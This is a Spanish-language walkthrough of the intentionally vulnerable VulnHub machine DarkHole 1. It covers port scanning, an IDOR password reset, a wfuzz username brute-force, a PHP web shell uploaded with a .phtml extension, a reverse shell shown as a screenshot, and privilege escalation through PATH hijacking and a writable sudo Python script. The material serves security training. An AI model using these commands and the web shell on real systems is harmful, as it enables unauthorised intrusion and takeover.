---
title: "DarkHole 1 - VulnHub"
author: zerowhiz
date: 2023-12-30
categories: [VulnHub]
tags: [Fácil, Linux]
image:
    path: ../../assets/Miniaturas/VulnHub/DarkHole-1.png
    width: 800
    height: 500
---

## Preparación del entorno

Hola, bienvenidos a la resolución de la máquina DarkHole 1 de VulnHub, la cual tiene una dificultad **fácil** y utiliza un sistema operativo **Linux**. A continuación, les dejo el enlace para que puedan descargar la máquina e importarla a VMware o VirtualBox.

> https://download.vulnhub.com/darkhole/DarkHole.zip
{: .prompt-info }

## Descubriendo la dirección IP

Una vez que la máquina esté iniciada, se le asignará una dirección IP que podremos identificar mediante la utilidad [arp-scan](https://github.com/royhills/arp-scan).

![](../../assets/Maquinas/DarkHole-1/arp-scan.png)

## Enumeración de puertos

Una vez que tengamos la dirección IP de la máquina objetivo, lo siguiente que haremos es descubrir qué puertos tiene abiertos internamente. Para esto, utilizaremos la herramienta [nmap](https://github.com/nmap/nmap).

![](../../assets/Maquinas/DarkHole-1/puertos.png)

El escaneo indica que hay 2 puertos abiertos: el puerto 80 (HTTP) y el puerto 22 (SSH). Vamos a utilizar nuevamente la herramienta nmap para verificar las versiones de los servicios desplegados en estos puertos

![](../../assets/Maquinas/DarkHole-1/versiones.png)

Gracias a este escaneo, podemos determinar que nos enfrentamos a una máquina Linux cuya distribución es Ubuntu. En el puerto 80, se encuentra desplegado un servidor web Apache de versión 2.4.41, mientras que en el puerto 22, está en funcionamiento el servicio SSH de versión 8.2.p1.

## Enumeración web

![](../../assets/Maquinas/DarkHole-1/web.png)

Lo primero que notamos al ingresar al servidor web es un botón amarillo que dice "View Details", aunque este no tiene ninguna función específica. Por otro lado, en el lado derecho y en la parte superior de la página web, encontramos un botón que nos lleva a un panel para autenticarnos.

![](../../assets/Maquinas/DarkHole-1/web-login.png)

En este momento, dado que no contamos con ningún usuario ni contraseña, podemos crear uno haciendo clic en donde dice "Sign Up"

![](../../assets/Maquinas/DarkHole-1/register.png)

Ahora que hemos creado una cuenta, procedemos a iniciar sesión para ver a dónde nos redirige el panel

![](../../assets/Maquinas/DarkHole-1/panel-1.png)

Al iniciar sesión, observamos que hay un campo llamado "Details" que muestra nuestro usuario y correo, y otro campo llamado "Password" que nos permite cambiar la contraseña de nuestra cuenta. Además, si prestamos atención a la URL, notamos que nuestro usuario tiene el ID número 2. Podríamos intentar cambiarlo para ver si podemos obtener información de otros usuarios, pero la página nos lanzará una alerta.

![](../../assets/Maquinas/DarkHole-1/url-1.png)

Si recordamos, había una sección que nos permitía modificar nuestra contraseña. Vamos a capturar esa petición utilizando la herramienta [Burp Suite](https://portswigger.net/burp).

![](../../assets/Maquinas/DarkHole-1/peticion-1.png)

Al capturar la petición, observamos que se envía un parámetro llamado 'id'. Modifiquemos el valor de 'id' a 1 para verificar si podemos cambiar la contraseña del primer usuario.

> POST: una petición POST implica enviar información al servidor a través del cuerpo del mensaje HTTP, en lugar de adjuntarla a la URL como en una petición GET
{: .prompt-info }

![](../../assets/Maquinas/DarkHole-1/peticion-2.png)

El servidor nos respondió con un código de estado exitoso. Por lo tanto, podemos deducir que hemos cambiado la contraseña. Ahora bien, hemos modificado la contraseña, ¿pero a qué usuario se la hemos cambiado?

Al tratarse de una máquina de dificultad fácil, podemos deducir que hemos cambiado la contraseña del usuario 'admin', lo cual es correcto. Sin embargo, de todas formas, realizaremos un ataque de fuerza bruta para intentar adivinar el usuario.

```
❯ wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -X POST --hh 2540 -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=zerowhiz" http://192.168.1.33/login.php 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.33/login.php
Total requests: 17

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000002:   302        49 L     197 W      2507 Ch     "admin"  
```

> https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
{: .prompt-info }

Si iniciamos sesión como el usuario 'admin', podremos observar una sección que nos permite cargar archivos en el servidor.

![](../../assets/Maquinas/DarkHole-1/upload-1.png)

El servidor web interpreta PHP, por lo que podemos intentar cargar un archivo malicioso que nos permita lograr una ejecución remota de comandos.

Aunque al intentar cargar un archivo con la extensión .php, el servidor no lo permite, sí nos permite subir archivos con la extensión .phtml.

```php
<?php
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

![](../../assets/Maquinas/DarkHole-1/upload-2.png)

Una vez que el archivo ha sido cargado, procederemos a verificar si tenemos ejecución remota de comandos.

![](../../assets/Maquinas/DarkHole-1/cmd-1.png)

Nos pondremos a la escucha con Netcat en nuestra máquina y enviaremos una reverse shell.

![](../../assets/Maquinas/DarkHole-1/reverse-shell.png)

> %20: Representa un espacio en blanco, solamente que codificado.
{: .prompt-info }
> %26: Representa el símbolo ampersand -> &
{: .prompt-info }

Hemos obtenido acceso a la máquina como el usuario www-data. Sin embargo, al revisar el archivo /etc/passwd, notamos la presencia de dos usuarios llamados 'darkhole' y 'john'.

```bash
www-data@darkhole:/var/www/html/upload$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
darkhole:x:1000:1000:john:/home/darkhole:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Al analizar el directorio personal del usuario 'john', observamos la presencia de un binario llamado 'toto'. Al ejecutarlo, parece que simplemente ejecuta el comando 'id'.

```bash
www-data@darkhole:/home/john$ ./toto
uid=1001(john) gid=33(www-data) groups=33(www-data)
www-data@darkhole:/home/john$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Con esta información, podemos intentar algo llamado '[Path Hijacking](https://walxom.net/posts/explotacion-de-un-path-hijacking/)' o, como su nombre indica, un 'secuestro de ruta'. Básicamente, si el comando 'id' se está ejecutando desde su ruta relativa y no desde la absoluta, podemos tratar de modificar la variable de entorno PATH. De esta manera, el binario 'toto' ejecutará un archivo creado por nosotros.

```bash
www-data@darkhole:/home/john$ cd /tmp
www-data@darkhole:/tmp$ echo "bash -p" > id
www-data@darkhole:/tmp$ chmod +x id 
www-data@darkhole:/tmp$ export PATH=/tmp:$PATH
www-data@darkhole:/tmp$ /home/john/toto 
john@darkhole:/tmp$ whoami
john
```
> Ruta Relativa: Se especifica sin referencia a la raíz del sistema de archivos
{: .prompt-info }
> Ruta absoluta: Comienza desde el directorio raíz
{: .prompt-info }

Si ejecutamos "sudo -l" para listar qué comandos podemos ejecutar como root siendo John, podemos ver que a través de Python3 podemos ejecutar un script llamado file.py, del cual John es el propietario (es decir, nosotros). Por lo tanto, vamos a modificarlo para que, al ser ejecutado, nos lance una shell como el usuario root.

```bash
john@darkhole:/home/john$ sudo -l
Matching Defaults entries for john on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
john@darkhole:/home/john$ ls -l file.py
-rwxrwx--- 1 john john 1 Jul 17  2021 file.py
john@darkhole:/home/john$ echo 'import os;os.system("/bin/bash")' > file.py 
john@darkhole:/home/john$ sudo /usr/bin/python3 /home/john/file.py
root@darkhole:/home/john# whoami
root
```
